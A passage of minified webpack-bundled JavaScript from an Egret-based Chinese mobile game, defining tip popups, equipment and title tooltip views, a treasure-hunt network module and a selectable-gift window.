__extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){this.addTouchEvent(this.goBtn,this.onClick),this.updateView(),this.txtType.textFlow=n.TextFlowMaker.generateTextFlow1(gettext("类型：|C:0xFFD9B5&T:{0}|",gettext("神符"))),this.txtJob.textFlow=n.TextFlowMaker.generateTextFlow1(gettext("职业：|C:0x10FF00&T:{0}|",gettext("通用"))),this.txtQua.textFlow=n.TextFlowMaker.generateTextFlow1(gettext("品质：|C:0x10FF00&T:{0}|",gettext("传说"))),this.lvLab.textFlow=n.TextFlowMaker.generateTextFlow1(gettext("等级：|C:0x10FF00&T:{0}级|",100))},e.prototype.onClick=function(t){switch(t.target){case this.goBtn:}},e.prototype.updateView=function(){},e}(o.BaseView);e.ShenFuEquipTipsWin=s,window.ShenFuEquipTipsWin=s,__reflect(s.prototype,"ShenFuEquipTipsWin",[]),window.ShenFuEquipTipsWin=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TipsView=void 0;var n=i(1),o=i(1318),s=i(1319),a=i(517),r=i(1320),l=i(1321),h=i(4),u=i(103),p=i(0),d=i(16),c=function(t){function e(){var e=t.call(this)||this;return e.defaultRect=!1,e.layoutNum=LayoutNum.top,e.list=[],e.centerList=[],e.taskTipsList=[],e.sceneList=[],e.attrList=[],e.everList=[],e.hintList=[],e.rewardTipList=[],e.goodEquipList=[],e.floatWinList=[],e.skillTipList=[],e.equipItemList=[],e.equipHeartItemList=[],e.touchChildren=!1,e.touchEnabled=!1,e.rewardTip=new o.TipsGoodReward,e.equipTip1=new s.TipsGoodEquip,e.skillTip1=new a.TipsSkillAlertPanel,e.equipTip=new r.TipsEquipAlertPanel,e.equipHeartTip=new l.TipsHeartEquipAlertPanel,e}return __extends(e,t),e.prototype.skinComplete=function(){observe(this,this.showExp,h.ActorCC.postExp)},e.prototype.showExp=function(t){t&&this.showTips(gettext("|C:0x23CA23&T:经验 +{0}|",t))},e.prototype.showHintTips=function(t){var e=ObjectPool.pop("HintTipsItem");e.bottom=260,e.horizontalCenter=0,e.setTips(t),this.addChild(e),this.hintList.unshift(e),e.addEventListener(egret.Event.REMOVED_FROM_STAGE,this.removeHintTip,this);for(var i=this.hintList.length-1;i>=0;i--){egret.Tween.removeTweens(this.hintList[i]);var n=egret.Tween.get(this.hintList[i]);n.to({bottom:260+-30*i},300)}},e.prototype.removeHintTip=function(t){var e=this.hintList.indexOf(t.currentTarget);this.hintList.splice(e,1),egret.Tween.removeTweens(t.currentTarget),t.currentTarget.removeEventListener(egret.Event.REMOVED_FROM_STAGE,this.removeHintTip,this),ObjectPool.push(t.currentTarget)},e.prototype.showEverTips=function(t){var e=ObjectPool.pop("EverTipsItem");e.x=t.x,e.y=t.y,e.labelText=t.str,this.addChild(e),this.everList.unshift(e),e.addEventListener(egret.Event.REMOVED_FROM_STAGE,this.removeEverTip,this);for(var i=this.everList.length-1;i>=0;i--){egret.Tween.removeTweens(this.everList[i]);var n=egret.Tween.get(this.everList[i]);n.to({y:e.y-30*i},300)}},e.prototype.removeEverTip=function(t){var e=this.everList.indexOf(t.currentTarget);this.everList.splice(e,1),egret.Tween.removeTweens(t.currentTarget),t.currentTarget.removeEventListener(egret.Event.REMOVED_FROM_STAGE,this.removeEverTip,this),ObjectPool.push(t.currentTarget)},e.prototype.showAttrTips=function(t){var e=ObjectPool.pop("AttriteChangeView");e.left=0,e.verticalCenter=0,e.setLabelText(t[0],t[1],t[2]),this.addChild(e),this.attrList.unshift(e),e.once(egret.Event.REMOVED_FROM_STAGE,this.removeAttrTip,this);for(var i=this.attrList.length-1;i>=0;i--){egret.Tween.removeTweens(this.attrList[i]);var n=egret.Tween.get(this.attrList[i]);n.to({verticalCenter:0-40*i},300)}},e.prototype.removeAttrTip=function(t){var e=this.attrList.indexOf(t.currentTarget);e>-1&&this.attrList.splice(e,1),egret.Tween.removeTweens(t.currentTarget),ObjectPool.push(t.currentTarget)},e.prototype.removeAllAttrTip=function(){for(;this.attrList.length;){var t=this.attrList.pop();d.DisplayUtils.removeFromParent(t)}},e.prototype.showCenterTips=function(t){var e=ObjectPool.pop("CenterTipsItem");e.verticalCenter=0,e.horizontalCenter=0,e.labelText=t,this.addChild(e),this.centerList.unshift(e),e.addEventListener(egret.Event.REMOVED_FROM_STAGE,this.removeCenterTip,this);for(var i=this.centerList.length-1;i>=0;i--){egret.Tween.removeTweens(this.centerList[i]);var n=egret.Tween.get(this.centerList[i]);n.to({verticalCenter:-30*i},500)}},e.prototype.removeCenterTip=function(t){var e=t.currentTarget,i=this.centerList.indexOf(e);this.centerList.splice(i,1),e.horizontalCenter=0/0,e.verticalCenter=0/0,egret.Tween.removeTweens(e),e.removeEventListener(egret.Event.REMOVED_FROM_STAGE,this.removeCenterTip,this),ObjectPool.push(e)},e.prototype.showCenterTips2=function(t){var e=ObjectPool.pop("CenterTipsItem");e.horizontalCenter=0,e.verticalCenter=-60,this.addChild(e),e.labelText2=t,this.centerList.unshift(e),e.addEventListener(egret.Event.REMOVED_FROM_STAGE,this.removeCenterTip2,this);for(var i=this.centerList.length-1;i>=0;i--){egret.Tween.removeTweens(this.centerList[i]);var n=egret.Tween.get(this.centerList[i]);n.to({verticalCenter:-120-30*i},300)}},e.prototype.showCenterTips5=function(t){var e=ObjectPool.pop("CenterTipsItem");e.horizontalCenter=0,e.verticalCenter=-60,this.addChild(e),e.labelText2=t,this.centerList.unshift(e),e.addEventListener(egret.Event.REMOVED_FROM_STAGE,this.removeCenterTip2,this);for(var i=this.centerList.length-1;i>=0;i--){egret.Tween.removeTweens(this.centerList[i]);var n=egret.Tween.get(this.centerList[i]);n.to({verticalCenter:-120-30*i},300)}},e.prototype.removeCenterTip2=function(t){var e=t.currentTarget;e.removeEventListener(egret.Event.REMOVED_FROM_STAGE,this.removeCenterTip2,this),e.horizontalCenter=0/0,e.verticalCenter=0/0;var i=this.centerList.indexOf(e);this.centerList.splice(i,1)},e.prototype.showCenterTips4=function(t){var e=this,i=ObjectPool.pop("BarrageTipsItem");i.x=u.StageUtils.ins().getWidth(),i.y=u.StageUtils.ins().getHeight()-u.StageUtils.ins().getHeight()/2-400*Math.random(),i.data=t,this.addChild(i),this.floatWinList.unshift(i),i.addEventListener(egret.Event.REMOVED_FROM_STAGE,this.removeCenterTip4,this),egret.Tween.removeTweens(i);var n=egret.Tween.get(i);n.to({x:-i.width},5e3).call(function(){e.removeChild(i)},this)},e.prototype.removeCenterTip4=function(t){var e=t.currentTarget;e.removeEventListener(egret.Event.REMOVED_FROM_STAGE,this.removeCenterTip4,this);var i=this.floatWinList.indexOf(e);this.floatWinList.splice(i,1)},e.prototype.showCenterTips3=function(t){var e=ObjectPool.pop("CenterTipsItem");e.verticalCenter=0,e.horizontalCenter=0,e.labelText3=t,this.addChild(e),this.centerList.unshift(e),e.addEventListener(egret.Event.REMOVED_FROM_STAGE,this.removeCenterTip3,this);for(var i=this.centerList.length-1;i>=0;i--){egret.Tween.removeTweens(this.centerList[i]);var n=egret.Tween.get(this.centerList[i]);n.to({verticalCenter:-30*i},500)}},e.prototype.showBottomCenterTips=function(t){var e=ObjectPool.pop("CenterTipsItem");e.bottom=220,e.horizontalCenter=0,e.labelText3=t,e.time=5e3,this.addChild(e),this.centerList.unshift(e),e.addEventListener(egret.Event.REMOVED_FROM_STAGE,this.removeCenterTip3,this);for(var i=this.centerList.length-1;i>=0;i--){egret.Tween.removeTweens(this.centerList[i]);var n=egret.Tween.get(this.centerList[i]);n.to({bottom:220+30*i},500)}},e.prototype.removeCenterTip3=function(t){var e=t.currentTarget,i=this.centerList.indexOf(e);this.centerList.splice(i,1),e.horizontalCenter=0/0,e.verticalCenter=0/0,egret.Tween.removeTweens(e),e.removeEventListener(egret.Event.REMOVED_FROM_STAGE,this.removeCenterTip,this),ObjectPool.push(e)},e.prototype.showSceneTips=function(t){var e=ObjectPool.pop("SceneTipsItem");e.verticalCenter=-175,e.horizontalCenter=0,e.labelText=t,this.addChild(e),this.sceneList.unshift(e),e.addEventListener(egret.Event.REMOVED_FROM_STAGE,this.removeSceneTip,this);for(var i=this.sceneList.length-1;i>=0;i--){egret.Tween.removeTweens(this.sceneList[i]);var n=egret.Tween.get(this.sceneList[i]);n.to({verticalCenter:-175+-30*i},500)}},e.prototype.removeSceneTip=function(t){var e=this.sceneList.indexOf(t.currentTarget);this.sceneList.splice(e,1),egret.Tween.removeTweens(t.currentTarget),t.currentTarget.removeEventListener(egret.Event.REMOVED_FROM_STAGE,this.removeSceneTip,this),ObjectPool.push(t.currentTarget)},e.prototype.showTaskTips=function(t){var e=ObjectPool.pop("CenterTipsItem");e.bottom=232,e.horizontalCenter=0,e.labelText=t,this.addChild(e),this.taskTipsList.unshift(e),e.addEventListener(egret.Event.REMOVED_FROM_STAGE,this.removeTaskTip,this);for(var i=this.taskTipsList.length-1;i>=0;i--){egret.Tween.removeTweens(this.taskTipsList[i]);var n=egret.Tween.get(this.taskTipsList[i]);n.to({bottom:232+30*i},500)}},e.prototype.removeTaskTip=function(t){var e=this.taskTipsList.indexOf(t.currentTarget);this.taskTipsList.splice(e,1),egret.Tween.removeTweens(t.currentTarget),t.currentTarget.removeEventListener(egret.Event.REMOVED_FROM_STAGE,this.removeTaskTip,this),ObjectPool.push(t.currentTarget)
},e.prototype.showTips=function(t){var e=ObjectPool.pop("TipsItem");e.verticalCenter=-120,e.horizontalCenter=0,this.addChild(e),e.labelText=t,this.list.unshift(e),e.addEventListener(egret.Event.REMOVED_FROM_STAGE,this.removeTipsItem,this);for(var i=this.list.length-1;i>=0;i--){egret.Tween.removeTweens(this.list[i]);var n=egret.Tween.get(this.list[i]);n.to({verticalCenter:-120-30*i},300)}},e.prototype.showTips1=function(t){var e=ObjectPool.pop("TipsItem");e.verticalCenter=-160,e.horizontalCenter=0,this.addChild(e),e.labelText=t,this.list.unshift(e),e.addEventListener(egret.Event.REMOVED_FROM_STAGE,this.removeTipsItem,this);for(var i=this.list.length-1;i>=0;i--){egret.Tween.removeTweens(this.list[i]);var n=egret.Tween.get(this.list[i]);n.to({verticalCenter:-160-30*i},300)}},e.prototype.removeTipsItem=function(t){var e=t.currentTarget;e.removeEventListener(egret.Event.REMOVED_FROM_STAGE,this.removeTipsItem,this),e.left=0/0,e.bottom=0/0;var i=this.list.indexOf(e);this.list.splice(i,1),ObjectPool.push(e)},e.prototype.showGoodRewardTip=function(t){this.rewardTipList.push(t),Timer.has(this.goodRewardTimer,this)||Timer.start(16,0,this.goodRewardTimer,this)},e.prototype.showTreasureTip=function(t){this.goodEquipList.push(t),Timer.has(this.goodEquipTimer,this)||Timer.start(16,0,this.goodEquipTimer,this)},e.prototype.showBoxTip=function(t){var e=p.GlobalConfig.TreasureBoxConfig[t];this.goodEquipList.push(e),Timer.has(this.goodEquipTimer,this)||Timer.start(16,0,this.goodEquipTimer,this)},e.prototype.goodRewardTimer=function(){var t=this;if(0==this.rewardTipList.length)return void Timer.stop(this.goodEquipTimer,this);if(!this.isWait){var e;if(this.rewardTip.isUsing||(e=this.rewardTip),e){e.x=50,e.y=750,e.alpha=1,e.parent||this.addChild(e),e.isUsing=!0,this.isWait=!0,e.data=this.rewardTipList.pop();var i=egret.Tween.get(e);i.to({y:600},300).wait(1e3).to({alpha:0},1e3).call(function(){e.isUsing=!1,t.isWait=!1,t.removeChild(e)})}}},e.prototype.goodEquipTimer=function(){var t=this;if(0==this.goodEquipList.length)return void Timer.stop(this.goodEquipTimer,this);if(!this.isWait){var e;if(this.equipTip1.isUsing||(e=this.equipTip1),e){e.x=50,e.y=750,e.alpha=1,e.parent||this.addChild(e),e.isUsing=!0,this.isWait=!0,e.data=this.goodEquipList.pop();var i=egret.Tween.get(e);i.to({y:600},300).wait(p.GlobalConfig.ClientGlobalConfig.itemShowTime).to({alpha:0},1e3).call(function(){e.isUsing=!1,t.isWait=!1,t.removeChild(e)})}}},e.prototype.showRewardBox=function(t){var e=p.GlobalConfig.TreasureBoxConfig[t];this.goodEquipList.push(e),Timer.has(this.goodEquipTimer,this)||Timer.start(16,0,this.goodEquipTimer,this)},e.prototype.showSkillTip=function(t){var e=ObjectPool.pop("TipsSkillAlertPanel");this.updateTips(e,t)},e.prototype.removeGoodEquipTip=function(t){var e=this.goodEquipList.indexOf(t.currentTarget);this.goodEquipList.splice(e,1),egret.Tween.removeTweens(t.currentTarget),t.currentTarget.removeEventListener(egret.Event.REMOVED_FROM_STAGE,this.removeGoodEquipTip,this),ObjectPool.push(t.currentTarget)},e.prototype.updateTips=function(t,e){var i=this;t.x=50,t.y=750,t.bottom=0,t.alpha=0,t.data=e,this.addChild(t),this.goodEquipList.unshift(t),t.addEventListener(egret.Event.REMOVED_FROM_STAGE,this.removeGoodEquipTip,this),egret.Tween.removeTweens(t);var n=t instanceof a.TipsSkillAlertPanel,o=p.GlobalConfig.ClientGlobalConfig,s=n?o.skillShowTime:o.itemShowTime,r=n?o.skillWaitTime:o.itemWaitTime,l=this.goodEquipList.length>1?r*(this.goodEquipList.length-1):0,h=egret.Tween.get(t);h.wait(l).to({alpha:1,bottom:160},300).wait(s).to({alpha:0,bottom:300},1e3).call(function(){i.removeChild(t)},this)},e.prototype.showGoodEquipTip=function(t){var e=ObjectPool.pop("TipsGoodEquip");this.updateTips(e,t)},e.prototype.showItemTip=function(t){this.equipItemList.push(t),Timer.has(this.itemTipTimer,this)||Timer.start(16,0,this.itemTipTimer,this)},e.prototype.itemTipTimer=function(){var t=this;if(0==this.equipItemList.length)return void Timer.stop(this.itemTipTimer,this);if(!this.isWait){var e;if(this.equipTip.isUsing||(e=this.equipTip),e){e.x=50,e.y=750,e.alpha=1,this.addChild(e),e.isUsing=!0,this.isWait=!0,e.data=this.equipItemList.pop();var i=egret.Tween.get(e);i.to({y:600},300).wait(1e3).to({alpha:0},1e3).call(function(){e.isUsing=!1,t.isWait=!1,t.removeChild(e)})}}},e.prototype.showHeartItemTip=function(t){this.equipHeartItemList.push(t),Timer.has(this.itemHeartTipTimer,this)||Timer.start(16,0,this.itemHeartTipTimer,this)},e.prototype.itemHeartTipTimer=function(){var t=this;if(0==this.equipHeartItemList.length)return void Timer.stop(this.itemHeartTipTimer,this);if(!this.isWait){var e;if(this.equipHeartTip.isUsing||(e=this.equipHeartTip),e){e.x=50,e.y=713,e.alpha=1,this.addChild(e),e.isUsing=!0,this.isWait=!0,e.data=this.equipHeartItemList.pop();var i=egret.Tween.get(e);i.to({y:563},300).wait(1e3).to({alpha:0},1e3).call(function(){e.isUsing=!1,t.isWait=!1,t.removeChild(e)})}}},e}(n.BaseView);e.TipsView=c,window.TipsView=c,__reflect(c.prototype,"TipsView",[]),window.TipsView=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TipsGoodReward=void 0;var n=i(1),o=i(30),s=i(36),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="OrangeEquipNoticeSkin2",e._isInit=!1,e.isUsing=!1,e.horizontalCenter=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this._isInit=!0,this.data=this._temData},Object.defineProperty(e.prototype,"data",{set:function(t){if(t instanceof o.RewardData){if(this._temData=t,!this._isInit)return;switch(t.id){case s.MoneyConst.yuanbao:this.desc.text=gettext("元宝"),this.skillName.text=""+this._temData.count,this.item.setItemImg(o.RewardData.CURRENCY_RES[this._temData.id]),this.item.isShowName(!1),this.item.showNum(!1)}}},enumerable:!1,configurable:!0}),e}(n.BaseView);e.TipsGoodReward=a,window.TipsGoodReward=a,__reflect(a.prototype,"TipsGoodReward",[]),window.TipsGoodReward=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TipsGoodEquip=void 0;var n=i(1),o=i(0),s=i(40),a=i(10),r=i(206),l=i(31),h=function(t){function e(){var e=t.call(this)||this;return e._sn_="OrangeEquipNoticeSkin",e.isUsing=!1,e.horizontalCenter=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.setData()},e.prototype.setData=function(){if(this.skin&&this.itemData){this.item.isShowName(!1);var t=o.GlobalConfig.ClientGlobalConfig.getDesc;if(this.itemData instanceof s.ItemData){var e=this.itemData.quality;this.item.showNum(!0),this.item.data=this.itemData,4==e?(this.desc.source=t[0],this.itemName.visible=!0):5==e&&(this.desc.source=t[0],this.itemName.visible=!0),7==a.ItemUtil.getType(this.itemData.itemConfig)&&(this.desc.source=t[1]),this.itemName.text=this.itemData.itemConfig.name,this.itemName.textColor=l.QUALITY_COLOR[e]}else if(this.itemData instanceof r.TreasureData){var i=o.GlobalConfig.SkirmishTreasureConfig[this.itemData.id];this.desc.source=t[2],this.item.setItemImg(i.icon),this.item.setImgBg(i.quality),this.item.showNum(!1),this.item.showName=!0,this.item.setName(i.name),this.itemName.text=i.name,this.itemName.textColor=l.QUALITY_COLOR[i.quality]}else{this.desc.source=t[1];var n=this.itemData;this.item.setItemImg(n.imgClose),this.itemName.text=n.name,this.itemName.textColor=l.QUALITY_COLOR[n.quality],this.item.showNum(!1)}}},Object.defineProperty(e.prototype,"data",{set:function(t){this.itemData=t,this.setData()},enumerable:!1,configurable:!0}),e}(n.BaseView);e.TipsGoodEquip=h,window.TipsGoodEquip=h,__reflect(h.prototype,"TipsGoodEquip",[]),window.TipsGoodEquip=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TipsEquipAlertPanel=void 0;var n=i(1),o=i(0),s=function(t){function e(){var e=t.call(this)||this;return e._sn_="OrangeEquipNoticeSkin2",e.isUsing=!1,e.horizontalCenter=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.setData()},Object.defineProperty(e.prototype,"data",{set:function(t){this.itemId=t,this.setData()},enumerable:!1,configurable:!0}),e.prototype.setData=function(){if(this.itemId&&this.skin){var t=o.GlobalConfig.ItemConfig[this.itemId];this.item.setItemImg(t.icon),this.item.setImgBg(1),this.desc.text=t.name,this.skillName.visible=!1,this.item.isShowName(!1),this.item.showNum(!1)}},e}(n.BaseView);e.TipsEquipAlertPanel=s,window.TipsEquipAlertPanel=s,__reflect(s.prototype,"TipsEquipAlertPanel",[]),window.TipsEquipAlertPanel=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TipsHeartEquipAlertPanel=void 0;var n=i(1),o=i(0),s=i(10),a=i(5),r=function(t){function e(){var e=t.call(this)||this;return e._sn_="guardGodWeaponNoticeTip",e.isUsing=!1,e.horizontalCenter=0,e}return __extends(e,t),Object.defineProperty(e.prototype,"data",{set:function(t){var e=o.GlobalConfig.ItemConfig[t];this.item.setItemImg(e.icon);var i=s.ItemUtil.getQuality2(e);this.item.setImgBg(i);var n=s.ItemUtil.getQualityColor(i);this.desc.textFlow=a.TextFlowMaker.generateTextFlow1("C:"+n+"&T:"+e.name),this.itemName.visible=!1,this.item.isShowName(!1),this.item.showNum(!1)},enumerable:!1,configurable:!0}),e}(n.BaseView);e.TipsHeartEquipAlertPanel=r,window.TipsHeartEquipAlertPanel=r,__reflect(r.prototype,"TipsHeartEquipAlertPanel",[]),window.TipsHeartEquipAlertPanel=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TitleTipsWin=void 0;var n=i(1),o=i(40),s=i(0),a=i(128),r=i(10),l=i(6),h=i(5),u=i(72),p=i(22),d=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="TitleTipsSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onClick),this.eBtn.visible=!1},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.data=t[0];var i;t&&t[0]instanceof o.ItemData?(i=this.data.itemConfig,this.eBtn.visible=!0):isNaN(this.data)?1==this.data.type&&(i=s.GlobalConfig.ItemConfig[this.data.id]):i=s.GlobalConfig.ItemConfig[this.data],this.update(i)},e.prototype.update=function(t){if(t){var e=a.Title.getTitleCfgByItemId(t.id),i=r.ItemUtil.getQuality2(t);this.itemname.text=t.name,this.itemname.textColor=r.ItemUtil.getQualityColor(i);var n=r.ItemUtil.getAttrPower(e.attrs);this.powerlab.text=gettext("战力:{0}",3*n),this.quali.source=i>0?"quali"+i:"";var o=[gettext("|C:0xfbf8ee&T:普通|"),gettext("|C:0x00ff3c&T:稀有|"),gettext("|C:0x066eba&T:珍贵|"),gettext("|C:0xd200ff&T:国器|"),gettext("|C:0xf45601&T:无双|")];this.quality.textFlow=h.TextFlowMaker.generateTextFlow1(o[e.rare]),this.img.source=e.img+"_png";var s=u.AttributeFormat.FORMAT_1();s.wordColor=null,s.attrColor=null,this.attrs.text=p.AttributeData.getAttStr1(e.attrs,s),this.description.textFlow=h.TextFlowMaker.generateTextFlow(t.desc),this.updateTitleEff(e)}},e.prototype.updateTitleEff=function(t){return this.eTitle.text=(null===t||void 0===t?void 0:t.name)||"",this.eTitle.textColor=r.ItemUtil.getQualityColor((null===t||void 0===t?void 0:t.rare)||0),t.eff?(this.titleMc||(this.titleMc=ObjectPool.pop("MovieClip"),this.effTopGrp.addChild(this.titleMc)),this.eTitle.visible=!1,this.effTopGrp.visible=!0,void this.titleMc.playFile(RES_DIR_EFF+t.eff,-1)):(this.titleMc&&this.effTopGrp.removeChild(this.titleMc),this.titleMc=null,this.effTopGrp.visible=!1,void(this.eTitle.visible=!0))},e.prototype.onClick=function(t){switch(t.target){case this.eBtn:this.data instanceof o.ItemData&&l.BagCT.ins().sendUseItem(this.data.configID,1);case this.bgClose:win.close(this)}},e}(n.BaseView);e.TitleTipsWin=d,window.TitleTipsWin=d,__reflect(d.prototype,"TitleTipsWin",[]),window.TitleTipsWin=d},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Hunt=void 0;var n=i(14),o=i(0),s=i(6),a=function(t){function e(){var e=t.call(this)||this;return e.sysId=PackageID.TreasureHunt,e.regNetMsg(1,e.doHuntResult),e.regNetMsg(2,e.postBestListInfo),e.regNetMsg(3,e.postHuntNum),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.sendHunt=function(t){var e=this.getBytes(1);e.writeShort(t),this.sendToServer(e)},e.prototype.sendHuntList=function(){this.sendBaseProto(2)},e.prototype.doHuntResult=function(t){for(var e=t.readShort(),i=t.readInt(),n=[],o=0;i>o;o++)n[o]=[t.readInt(),t.readInt()];win.get("HuntResultWin")?this.postHuntResult(e,n,0):(win.open("HuntResultWin",e,n,0),this.postHuntResult(e,n,0))},e.prototype.postHuntResult=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return t},e.prototype.postBestListInfo=function(t){for(var e=t.readShort(),i=[],n=0;e>n;n++)i[n]=[t.readString(),t.readInt()];return i.reverse(),i},e.prototype.sendHuntNum=function(){this.sendBaseProto(3)},e.prototype.postHuntNum=function(t){return t.readUnsignedInt()},e.prototype.checkRed=function(t,e){var i=s.BagCT.ins().getBagGoodsByTypeAndId(s.BagCT.BAG_TYPE_OTHTER,t),n=i?i.count:0;return n>=e},e.prototype.checkHuntRed=function(t){return this.checkRed(o.GlobalConfig.TreasureHuntConfig.huntItem,t)},e.prototype.checkRuneRed=function(t){return this.checkRed(o.GlobalConfig.FuwenTreasureConfig.huntItem,t)},e.prototype.checkChuanshiRed=function(t){return this.checkRed(o.GlobalConfig.HeirloomTreasureConfig.huntItem,t)},__decorate([post()],e.prototype,"postHuntResult",null),__decorate([post()],e.prototype,"postBestListInfo",null),__decorate([post()],e.prototype,"postHuntNum",null),e}(n.BaseSystem);e.Hunt=a,window.Hunt=a,__reflect(a.prototype,"Hunt",[]),Systemap.Hunt=function(){return a.ins()},window.Hunt=a},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TreasureChuanshiGiftWin=void 0;var n=i(19),o=i(5),s=i(1),a=i(0),r=i(39),l=i(4),h=i(6),u=i(40),p=i(285),d=i(2),c=i(26),f=i(1331),g=i(324),m=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="TreasureChuanshiGift",e.lastSelected=-1,e.maxNum=0,e.giftListData=[],e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.type=t[0],this.id=t[1],this.num=t[2],this.addTouchEvent(this,this.onTouch),observe(this,this.otherClose,h.BagCT.ins().postGiftResult),this.addTouchEndEvent(this.minBtn0,this.onTap),this.addTouchEndEvent(this.maxBtn0,this.onTap),this.addTouchEndEvent(this.sub1Btn0,this.onTap),this.addTouchEndEvent(this.add1Btn0,this.onTap),this.addChangeEvent(this.numLabel0,this.onTxtChange),this.numLabel0.restrict="0-9",this.numLabel0.text="0",this.add.touchEnabled=!1,this.add.touchChildren=!1,this.update()},e.prototype.update=function(){var t=a.GlobalConfig.OptionalGiftConfig[this.id];if(this.gift.itemRenderer=f.TreasureChuanshiItemRender,t.show[0].reward.length<=4){var e=this.gift.layout;e.requestedColumnCount=t.show[0].reward.length}this.validateNow();for(var i=[],n=0;n<t.options.length;n++){var s=a.GlobalConfig.ItemConfig[t.options[n].itemid];if(a.GlobalConfig.ItemDescConfig[s.descIndex].type==r.ItemType.TYPE_55){if(t.options[n].job==l.ActorCC.jobId||void 0==t.options[n].job){var h=new g.TreasureItemData;h.count=t.show[0].reward[n].count,h.id=t.show[0].reward[n].id,h.type=t.show[0].reward[n].type,h.gemId=t.options[n].gemId,h.iconUrl=a.GlobalConfig.GemPrefixConfig[h.gemId].icon,h.itemId=t.options[n].itemid,h.gemQlt=t.options[n].gemLv,i.push(h)}}else i.push(t.show[0].reward[n])}this.giftListData=i,this.gift.dataProvider=new eui.ArrayCollection(i),this.gift.validateNow(),this.choose.textFlow=o.TextFlowMaker.generateTextFlow1(t.show[0].str),this.maxNum=this.num,this.useNum=0},e.prototype.removeDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.removeTouchEvent(this,this.onTouch),this.lastSelected=-1},e.prototype.onTouch=function(t){if(t.target==this.get){if(this.gift.selectedIndex<0)return void d.TipsCT.ins().showTips(gettext("请选择一个奖励"));if(!this.useNum)return void d.TipsCT.ins().showTips(gettext("请选择开启的数量"));var e=a.GlobalConfig.OptionalGiftConfig[this.id],i=e.options[this.gift.selectedIndex];if(l.ActorCC.level<i.level)return void d.TipsCT.ins().showTips(gettext("人物等级{0}才能领取",i.level));if(c.ZsCT.ins().stage<i.zslimit)return void d.TipsCT.ins().showTips(gettext("转生等级{1}才能领取",i.zslimit));for(var o=this.giftListData[this.gift.selectedIndex],s=0,f=0;f<e.options.length;f++)if(e.options[f].gemId==o.gemId){s=f;break}var g=a.GlobalConfig.ItemConfig[o.id];a.GlobalConfig.ItemDescConfig[g.descIndex].type==r.ItemType.TYPE_55?h.BagCT.ins().sendChoosableGift(this.id,this.useNum,s):h.BagCT.ins().sendChoosableGift(this.id,this.useNum,this.gift.selectedIndex)}else if(t.target.parent==this.gift){var m;this.lastSelected>=0&&(m=this.gift.getChildAt(this.lastSelected),m.checkSelcted(this.gift.selectedIndex));var o=this.giftListData[this.gift.selectedIndex],g=a.GlobalConfig.ItemConfig[o.id];if((a.GlobalConfig.ItemDescConfig[g.descIndex].type==r.ItemType.TYPE_55||a.GlobalConfig.ItemDescConfig[g.descIndex].type==r.ItemType.TYPE_6)&&this.lastSelected==this.gift.selectedIndex){var v=new u.ItemData;v.treasureData=o;var y=new p.EquipInlayPrefixData;y.id=o.gemId,y.lv=o.gemQlt,v.setGemPrefixData(y),v.configID=o.itemId,n.GlobalFun.showDetail(g,v)}this.lastSelected=this.gift.selectedIndex,this.gift.dataProvider&&this.lastSelected>-1&&this.lastSelected<this.gift.dataProvider.length&&(m=this.gift.getChildAt(this.lastSelected),m.checkSelcted(this.gift.selectedIndex)),this.add.touchChildren=!0,this.useNum=1,this.numLabel0.text=this.useNum+""}else t.target==this.bgClose&&this.otherClose()},e.prototype.otherClose=function(){win.close(this)},e.prototype.onTap=function(t){switch(t.target){case this.minBtn0:this.useNum=1;break;case this.maxBtn0:this.useNum=this.maxNum;break;case this.sub1Btn0:this.useNum--,this.useNum<=0&&(this.useNum=1);break;case this.add1Btn0:this.useNum++,this.useNum>this.maxNum&&(this.useNum=this.maxNum)}this.numLabel0.text=this.useNum+""},e.prototype.onTxtChange=function(t){var e=Number(this.numLabel0.text);e>this.maxNum?e=this.maxNum:0>=e&&(e=1),this.useNum=e,this.numLabel0.text=this.useNum+""},e}(s.BaseView);e.TreasureChuanshiGiftWin=m,window.TreasureChuanshiGiftWin=m,__reflect(m.prototype,"TreasureChuanshiGiftWin",[]),window.TreasureChuanshiGiftWin=m},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TreasureChuanshiItemRender=void 0;var n=i(3),o=function(t){function e(){var e=t.call(this)||this;return e._sn_="TreasureChuanshiItem",e.touchChildren=!1,e.touchEnabled=!0,e}return __extends(e,t),e.prototype.dataChanged=function(){this.gift.data=this.data,this.select.visible=this.select2.visible=!1},e.prototype.checkSelcted=function(t){this.select.visible=this.select2.visible=this.itemIndex==t},e}(n.BaseItemRender);e.TreasureChuanshiItemRender=o,window.TreasureChuanshiItemRender=o,__reflect(o.prototype,"TreasureChuanshiItemRender",[]),window.TreasureChuanshiItemRender=o},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TunTianEquipWin=void 0;var n=i(1),o=i(17),s=i(0),a=i(15),r=i(12),l=i(2),h=i(113),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="TunTianEquipSkin",e.isTopLevel=!0,e}return 